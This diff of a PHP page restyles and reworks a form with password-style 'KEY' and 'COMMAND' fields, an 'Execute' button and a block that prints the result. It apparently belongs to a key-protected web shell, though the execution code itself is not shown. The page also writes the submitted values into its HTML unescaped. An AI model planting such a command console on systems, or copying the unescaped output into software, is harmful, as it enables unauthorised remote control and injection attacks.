@@ -33,10 +33,8 @@
             margin-bottom: 20px;        
             overflow: auto;
         }
-        .prompt input[type="text"]{
-            width: 500px;
+        .prompt .field{
             background-color: transparent;
-            color: yellow;
             border: 1px solid darkslateblue;
             font-size: 20px;
             line-height: 35px;
@@ -44,24 +42,37 @@
             letter-spacing: 2px;
             margin-bottom: 10px;
         }
-        .prompt input[type="submit"]{
+
+        .prompt #key{
+            width: 300px;
+            color: yellow;
+        }
+
+        .prompt #command{
+            width: 500px;
+            color: yellow;
+        }
+
+        .prompt .button{
             background-color: #999;
             border: 1px solid gray;
             line-height: 32px;
             width: 145px;
             font-size: 20px;
-            font-weight: bold;
             color: #333;
             padding: 7px;
+            border-radius: 5px;
+            font-weight: 600;
+            font-family: Arial;
         }
     </style>
 </head>
 <body>
     <div class="result"><pre><?= $ret ?></pre></div>
-    <form action="" class="prompt" method="post">
-        <input type="text" placeholder="KEY" name="key" value="<?= $key ?>"/>
-        <input type="text" placeholder="COMMAND" name="cmd" autofocus value="<?= $cmd ?>"/>
-        <input type="submit" value="Execute" />
+    <form class="prompt" method="post">
+        <input class="field" id="key" autocomplete="false" type="password" placeholder="KEY" name="key" value="<?= $key ?>"/><br>
+        <input class="field" id="command" type="text" placeholder="COMMAND" name="cmd" autofocus value="<?= $cmd ?>"/>
+        <input class="button" type="submit" value="Execute" />
     </form>
 </body>
 </html>
